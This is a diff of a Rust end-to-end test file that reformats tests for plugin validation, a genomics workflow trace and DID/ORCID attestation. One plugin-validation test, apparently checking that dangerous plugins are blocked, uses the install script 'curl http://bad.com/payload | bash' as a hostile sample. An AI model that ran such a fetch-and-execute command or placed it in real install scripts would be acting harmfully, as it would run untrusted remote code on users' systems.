@@ -47,18 +47,19 @@ fn test_e2e_plugin_validation_full() {
 
 #[test]
 fn test_e2e_plugin_blocked_dangerous() {
-    let validator = PluginValidator::new(
-        vec!["https://github.com".into()],
-        true, 5,
-    );
+    let validator = PluginValidator::new(vec!["https://github.com".into()], true, 5);
     let manifest = PluginManifest {
-        id: "evil".into(), name: "Evil".into(), version: "1.0".into(),
+        id: "evil".into(),
+        name: "Evil".into(),
+        version: "1.0".into(),
         source: "https://github.com/evil/plugin".into(),
         signature: None,
         install_script: "curl http://bad.com/payload | bash".into(),
         requested_permissions: vec![],
-        dependencies: vec![], checksum: None,
-        author_did: None, node_desci_ref: None,
+        dependencies: vec![],
+        checksum: None,
+        author_did: None,
+        node_desci_ref: None,
     };
 
     let r = validator.validate(&manifest).unwrap();
@@ -165,18 +166,16 @@ fn test_e2e_ssrf_blocks_internal() {
 
 #[test]
 fn test_e2e_workflow_full_lifecycle() {
-    let mut trace = ScientificWorkflowTrace::new(
-        "BRCA1_variant_calling",
-        WorkflowType::Nextflow,
-    )
-    .with_owner("did:arkhe:orcid:abc12345")
-    .with_metadata("sample", "BRCA1_001");
+    let mut trace = ScientificWorkflowTrace::new("BRCA1_variant_calling", WorkflowType::Nextflow)
+        .with_owner("did:arkhe:orcid:abc12345")
+        .with_metadata("sample", "BRCA1_001");
 
     // Step 1: Download
     let mut s1 = WorkflowStep::new("dl", "Download Reference", "wget")
         .with_parameters(json!({"url": "https://example.com/hg38.fa.gz"}))
         .with_agent("did:arkhe:agent-downloader");
-    s1.start(); s1.complete(vec!["hg38.fa.gz".into()]);
+    s1.start();
+    s1.complete(vec!["hg38.fa.gz".into()]);
     trace.add_step(s1).unwrap();
 
     // Step 2: Index
@@ -184,21 +183,24 @@ fn test_e2e_workflow_full_lifecycle() {
         .with_parameters(json!({"algo": "bwtsw"}))
         .with_inputs(vec!["hg38.fa.gz".into()])
         .with_agent("did:arkhe:agent-bioinfo");
-    s2.start(); s2.complete(vec!["hg38.fa.bwt".into()]);
+    s2.start();
+    s2.complete(vec!["hg38.fa.bwt".into()]);
     trace.add_step(s2).unwrap();
 
     // Step 3: Align
     let mut s3 = WorkflowStep::new("aln", "Align Reads", "bwa-mem")
         .with_inputs(vec!["hg38.fa.gz".into(), "reads.fq".into()])
         .with_agent("did:arkhe:agent-bioinfo");
-    s3.start(); s3.complete(vec!["aligned.sam".into()]);
+    s3.start();
+    s3.complete(vec!["aligned.sam".into()]);
     trace.add_step(s3).unwrap();
 
     // Step 4: Variant call
     let mut s4 = WorkflowStep::new("vc", "Call Variants", "bcftools")
         .with_inputs(vec!["aligned.sam".into()])
         .with_agent("did:arkhe:agent-caller");
-    s4.start(); s4.complete(vec!["variants.vcf.gz".into()]);
+    s4.start();
+    s4.complete(vec!["variants.vcf.gz".into()]);
     trace.add_step(s4).unwrap();
 
     // Verify
@@ -264,12 +266,7 @@ fn test_e2e_orcid_did_full_flow() {
     assert!(!odid.verified);
 
     // Create attestation
-    let att = create_attestation(
-        "did:arkhe:authority-01",
-        &did,
-        orcid,
-        48,
-    );
+    let att = create_attestation("did:arkhe:authority-01", &did, orcid, 48);
     assert!(verify_attestation(&att));
 
     // Verify tamper detection
@@ -345,10 +342,11 @@ fn test_e2e_cross_module_full_pipeline() {
     assert!(validator.validate(&manifest).unwrap().passed);
 
     // 2. Workflow com owner DID
-    let mut trace = ScientificWorkflowTrace::new("cross-test", WorkflowType::Nextflow)
-        .with_owner(&did);
+    let mut trace =
+        ScientificWorkflowTrace::new("cross-test", WorkflowType::Nextflow).with_owner(&did);
     let mut s = WorkflowStep::new("s1", "Step", "tool").with_agent(&did);
-    s.start(); s.complete(vec!["out".into()]);
+    s.start();
+    s.complete(vec!["out".into()]);
     trace.add_step(s).unwrap();
     assert!(trace.verify());
 
